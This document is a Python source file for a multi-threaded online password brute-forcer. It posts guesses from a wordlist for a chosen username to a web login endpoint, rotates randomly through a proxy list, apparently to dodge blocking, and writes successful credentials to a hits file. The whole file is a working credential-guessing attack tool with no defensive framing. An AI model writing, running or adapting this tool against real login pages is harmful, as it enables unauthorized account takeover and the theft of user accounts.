import requests, threading, queue, time, string, random
from urllib.parse import urlparse

class SimpleBruteForcer:
    def __init__(self, url, username, wordlist, threads=5, proxy_file=None):
        self.url=url; self.username=username; self.wordlist=wordlist
        self.threads=threads; self.proxy_file=proxy_file
        self.passwords=queue.Queue(); self.success=threading.Event()
        self.stop_flag=threading.Event(); self.pause=threading.Event()
        self.log=print
        self.proxies=self.load_proxies()
        self.load_wordlist()

    def set_log_callback(self, cb): self.log=cb
    def toggle_pause(self): self.pause.set() if not self.pause.is_set() else self.pause.clear()
    def stop(self): self.stop_flag.set()

    def load_proxies(self):
        lst=[]
        if self.proxy_file:
            try:
                with open(self.proxy_file,'r',encoding='utf-8',errors='ignore') as f:
                    for l in f:
                        l=l.strip()
                        if l: lst.append(l)
                self.log(f"[i] Loaded {len(lst)} proxies")
            except Exception as e:
                self.log(f"[ERROR] Proxy load failed: {e}")
        return lst

    def load_wordlist(self):
        with open(self.wordlist,'r',encoding='utf-8',errors='ignore') as f:
            for l in f:
                c=''.join(ch for ch in l.strip() if ch in string.printable)
                if c: self.passwords.put(c)

    def pick_proxy(self):
        if not self.proxies: return None
        p=random.choice(self.proxies)
        return {"http": p, "https": p}

    def attempt(self, pw):
        s=requests.Session()
        proxy=self.pick_proxy()
        if proxy: s.proxies.update(proxy)
        parsed=urlparse(self.url)
        post=f"{parsed.scheme}://{parsed.netloc}/accounts/v2/password"
        data={"username":self.username,"password":pw}
        self.log(f"Trying {pw}" + (f" via {proxy}" if proxy else ""))
        r=s.post(post,data=data,timeout=10)
        if r.status_code==200 and ("dashboard" in r.text or "/welcome" in r.url):
            self.log(f"[HIT] {pw}")
            with open("hits.txt","a",encoding="utf-8") as f:
                f.write(f"{self.url}|{self.username}|{pw}\n")
            self.success.set(); return True
        return False

    def worker(self):
        while not self.passwords.empty() and not self.success.is_set() and not self.stop_flag.is_set():
            if self.pause.is_set(): time.sleep(0.3); continue
            pw=self.passwords.get()
            try:
                if self.attempt(pw): break
            except Exception as e:
                self.log(f"[ERR] {e}")
            time.sleep(1.0)

    def run(self):
        ts=[]
        for _ in range(self.threads):
            t=threading.Thread(target=self.worker,daemon=True); t.start(); ts.append(t)
        for t in ts: t.join()
        if not self.success.is_set(): self.log("❌ No password found")
